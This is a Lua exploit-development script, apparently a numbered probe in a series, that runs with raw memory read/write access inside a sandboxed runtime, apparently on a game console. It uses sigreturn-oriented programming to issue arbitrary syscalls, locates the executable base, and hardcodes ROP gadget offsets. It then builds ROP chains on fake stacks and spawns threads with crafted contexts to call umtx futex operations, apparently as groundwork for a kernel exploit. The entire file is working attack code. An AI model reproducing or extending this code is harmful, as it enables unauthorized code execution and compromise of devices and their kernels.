-- CRASH_CLASS: LOW
-- PROBE 142j: 80a format (MC=0x10) + ROP chain
--
-- Two competing theories:
-- A) getcontext format (MC=0x40): threads crash with binary output (142c-142i)
-- B) 80a format (MC=0x10): threads get TIDs, no crash, but no observable exec
--
-- Theory: 80a's threads didn't execute because GPRs were wrong, but RIP WAS
-- set correctly. With a ROP chain (all GPRs set via stack), we bypass the
-- GPR offset issue entirely. If 80a's mc_rip IS correct, the thread will
-- start at our `ret` gadget and execute the ROP chain.
--
-- Fallback theory: 142c-142i crashes are because getcontext format overwrites
-- thr_create's control reg fields at MC=0x10 positions, corrupting them.

print("=== PROBE 142j: 80a+ROP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

-- SROP helper context (MC=0x40 for sigreturn only)
local MC_S = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC_S + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC_S + 0xA0, sc_addr)
    wq(srop_ctx + MC_S + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC_S + 0x08, a1) end
    if a2 then wq(srop_ctx + MC_S + 0x10, a2) end
    if a3 then wq(srop_ctx + MC_S + 0x18, a3) end
    if a4 then wq(srop_ctx + MC_S + 0x50, a4) end
    if a5 then wq(srop_ctx + MC_S + 0x28, a5) end
    if a6 then wq(srop_ctx + MC_S + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local ts_buf = memory.alloc(16)
wq(ts_buf, uint64(0)); wq(ts_buf + 8, uint64(500000000))
local function msleep()
    pcall(function() sc_nanosleep(uint64(ts_buf), uint64(0)) end)
end

-- Eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = safe_rd(info + 0x108) or 0
local ehi = safe_rd(info + 0x10C) or 0
print("eboot=0x" .. string.format("%X%08X", ehi, elo))

-- Gadget addresses (from 142g)
local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))

-- Main TID
local tid_main = gpu + 0x100
wq(tid_main, uint64(0))
srop(432, ua(tid_main))
local mtl = to_num(safe_rd(tid_main))
print("main_TID=" .. mtl)

-- 80a thr_create offsets (MC=0x10, verified control regs)
local T = 0x10
local T_RIP    = T + 0x80    -- 0x90, verified
local T_CS     = T + 0x88    -- 0x98, verified
local T_RFLAGS = T + 0x90    -- 0xA0, verified
local T_RSP    = T + 0x98    -- 0xA8, verified
local T_SS     = T + 0xA0    -- 0xB0, verified
local T_LEN    = T + 0x108   -- 0x118, verified

--------------------------------------------------------------------
-- [A] 80a format + ROP: UMTX_OP_WAIT
-- Zero context, set only verified control regs + mc_len.
-- ROP chain handles all GPRs.
--------------------------------------------------------------------
print("")
print("--- [A] 80a+ROP: WAIT ---")

local futex_a = gpu + 0x1000
wd(futex_a, 0)

local stack_a = gpu + 0x10000
for off = 0, 0x3FFF, 4 do wd(stack_a + off, 0) end

-- ROP chain
local rop_a = stack_a + 0x3000
wq(rop_a + 0x00, g_pop_rdi)
wq(rop_a + 0x08, ua(futex_a))        -- rdi = futex
wq(rop_a + 0x10, g_pop_rsi)
wq(rop_a + 0x18, uint64(6))          -- rsi = UMTX_OP_WAIT
wq(rop_a + 0x20, g_pop_rax)
wq(rop_a + 0x28, uint64(454))        -- rax = umtx_op
wq(rop_a + 0x30, sc_addr)            -- syscall
-- rdx=0 (from zeroed regs), r10=0, r8=0
-- *futex=0 == rdx=0 → thread blocks

-- Context: zero-fill, set only verified fields
local ctx_a = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(ctx_a + off, 0) end

wq(ctx_a + T_RIP, g_ret)                     -- start at ret gadget
wq(ctx_a + T_CS, uint64(0x43))               -- user-mode CS
wq(ctx_a + T_RFLAGS, uint64(0x202))          -- IF set
wq(ctx_a + T_RSP, ua(rop_a))                 -- stack = ROP chain
wq(ctx_a + T_SS, uint64(0x3B))               -- user-mode SS
wq(ctx_a + T_LEN, uint64(0x480))             -- mcontext length

local tid_a = gpu + 0x30000
wq(tid_a, uint64(0xDEADDEAD))

print("[A] Creating thread...")
local ok_a, rv_a = pcall(function()
    return sc_thr_create(uint64(ctx_a), uint64(tid_a), uint64(0))
end)
local ntid_a = safe_rq(tid_a)
local nah, nal = get_hi_lo(ntid_a)
print("[A] ok=" .. tostring(ok_a) .. " rv=" .. tostring(rv_a) .. " tid=" .. nal)

msleep()
print("[A] alive pid=" .. to_num(sc20()))

if nal ~= 0 and nal ~= 0xDEADDEAD then
    local rv_ka = srop(433, uint64(nal), uint64(0))
    local kah, kal = get_hi_lo(rv_ka)
    print("[A] thr_kill=" .. hex(rv_ka) .. " (0=alive)")
    if kal == 0 and kah == 0 then
        print("[A] *** CHILD IS ALIVE (BLOCKED IN WAIT)! ***")
        print("[A] *** THREAD EXECUTION CONFIRMED! ***")
    end
end

--------------------------------------------------------------------
-- [B] 80a format + getcontext (hybrid): fill getcontext first, then
-- overwrite ONLY the 80a control reg positions. This gives us valid
-- FP state and signal mask from getcontext, but correct control regs
-- from the 80a layout.
--------------------------------------------------------------------
print("")
print("--- [B] getctx + 80a ctrl + ROP ---")

local futex_b = gpu + 0x2000
wd(futex_b, 0)

local stack_b = gpu + 0x14000
for off = 0, 0x3FFF, 4 do wd(stack_b + off, 0) end

local rop_b = stack_b + 0x3000
wq(rop_b + 0x00, g_pop_rdi)
wq(rop_b + 0x08, ua(futex_b))
wq(rop_b + 0x10, g_pop_rsi)
wq(rop_b + 0x18, uint64(6))
wq(rop_b + 0x20, g_pop_rax)
wq(rop_b + 0x28, uint64(454))
wq(rop_b + 0x30, sc_addr)

local ctx_b = gpu + 0x28000
for off = 0, 0x4FF, 4 do wd(ctx_b + off, 0) end
pcall(function() return sc_gc(uint64(ctx_b)) end)  -- fill with valid data

-- Override ONLY 80a control reg positions
wq(ctx_b + T_RIP, g_ret)
wq(ctx_b + T_CS, uint64(0x43))
wq(ctx_b + T_RFLAGS, uint64(0x202))
wq(ctx_b + T_RSP, ua(rop_b))
wq(ctx_b + T_SS, uint64(0x3B))
wq(ctx_b + T_LEN, uint64(0x480))

local tid_b = gpu + 0x30010
wq(tid_b, uint64(0xDEADDEAD))

print("[B] Creating thread...")
local ok_b, rv_b = pcall(function()
    return sc_thr_create(uint64(ctx_b), uint64(tid_b), uint64(0))
end)
local ntid_b = safe_rq(tid_b)
local nbh, nbl = get_hi_lo(ntid_b)
print("[B] ok=" .. tostring(ok_b) .. " rv=" .. tostring(rv_b) .. " tid=" .. nbl)

msleep()
print("[B] alive pid=" .. to_num(sc20()))

if nbl ~= 0 and nbl ~= 0xDEADDEAD then
    local rv_kb = srop(433, uint64(nbl), uint64(0))
    local kbh, kbl = get_hi_lo(rv_kb)
    print("[B] thr_kill=" .. hex(rv_kb) .. " (0=alive)")
    if kbl == 0 and kbh == 0 then
        print("[B] *** CHILD IS ALIVE! ***")
    end
end

--------------------------------------------------------------------
-- [C] LOCK_PI via 80a+ROP on owned futex
--------------------------------------------------------------------
print("")
print("--- [C] 80a+ROP LOCK_PI owned ---")

local futex_c = gpu + 0x3000
wd(futex_c, 0)
local rv_ml = srop(454, ua(futex_c), uint64(12), uint64(0), uint64(0), uint64(0))
print("[C] main LOCK_PI: ret=" .. hex(rv_ml) .. " futex=0x" .. string.format("%X", safe_rd(futex_c) or 0))

local stack_c = gpu + 0x18000
for off = 0, 0x3FFF, 4 do wd(stack_c + off, 0) end

local rop_c = stack_c + 0x3000
wq(rop_c + 0x00, g_pop_rdi)
wq(rop_c + 0x08, ua(futex_c))
wq(rop_c + 0x10, g_pop_rsi)
wq(rop_c + 0x18, uint64(12))     -- LOCK_PI
wq(rop_c + 0x20, g_pop_rax)
wq(rop_c + 0x28, uint64(454))
wq(rop_c + 0x30, sc_addr)

local ctx_c = gpu + 0x30100
for off = 0, 0x4FF, 4 do wd(ctx_c + off, 0) end
wq(ctx_c + T_RIP, g_ret)
wq(ctx_c + T_CS, uint64(0x43))
wq(ctx_c + T_RFLAGS, uint64(0x202))
wq(ctx_c + T_RSP, ua(rop_c))
wq(ctx_c + T_SS, uint64(0x3B))
wq(ctx_c + T_LEN, uint64(0x480))

local tid_c = gpu + 0x30020
wq(tid_c, uint64(0xDEADDEAD))

print("[C] Creating thread...")
local ok_c, rv_c = pcall(function()
    return sc_thr_create(uint64(ctx_c), uint64(tid_c), uint64(0))
end)
local ntid_c = safe_rq(tid_c)
local nch, ncl = get_hi_lo(ntid_c)
print("[C] ok=" .. tostring(ok_c) .. " rv=" .. tostring(rv_c) .. " tid=" .. ncl)

msleep()
print("[C] alive pid=" .. to_num(sc20()))

local fvc = safe_rd(futex_c)
print("[C] futex=0x" .. string.format("%X", fvc or 0))
if fvc and fvc >= 0x80000000 then
    print("[C] *** CONTESTED BIT! CHILD BLOCKED IN LOCK_PI! ***")
end

if ncl ~= 0 and ncl ~= 0xDEADDEAD then
    local rv_kc = srop(433, uint64(ncl), uint64(0))
    print("[C] thr_kill=" .. hex(rv_kc))
end

--------------------------------------------------------------------
-- [D] Check sys624 delta from thread creation
--------------------------------------------------------------------
print("")
print("--- [D] sys624 check ---")
local s_before = srop(624)
local sbh, sbl = get_hi_lo(s_before)

-- Create another thread (same WAIT pattern)
local stack_d = gpu + 0x1C000
for off = 0, 0x3FFF, 4 do wd(stack_d + off, 0) end
local futex_d = gpu + 0x4000
wd(futex_d, 0)

local rop_d = stack_d + 0x3000
wq(rop_d + 0x00, g_pop_rdi)
wq(rop_d + 0x08, ua(futex_d))
wq(rop_d + 0x10, g_pop_rsi)
wq(rop_d + 0x18, uint64(6))
wq(rop_d + 0x20, g_pop_rax)
wq(rop_d + 0x28, uint64(454))
wq(rop_d + 0x30, sc_addr)

local ctx_d = gpu + 0x38000
for off = 0, 0x4FF, 4 do wd(ctx_d + off, 0) end
wq(ctx_d + T_RIP, g_ret)
wq(ctx_d + T_CS, uint64(0x43))
wq(ctx_d + T_RFLAGS, uint64(0x202))
wq(ctx_d + T_RSP, ua(rop_d))
wq(ctx_d + T_SS, uint64(0x3B))
wq(ctx_d + T_LEN, uint64(0x480))

local tid_d = gpu + 0x30030
wq(tid_d, uint64(0xDEADDEAD))
pcall(function()
    return sc_thr_create(uint64(ctx_d), uint64(tid_d), uint64(0))
end)

msleep()

local s_after = srop(624)
local sah, sal = get_hi_lo(s_after)
print("[D] sys624: before=" .. sbl .. " after=" .. sal .. " delta=" .. (sal - sbl))

print("")
print("=== DONE ===")
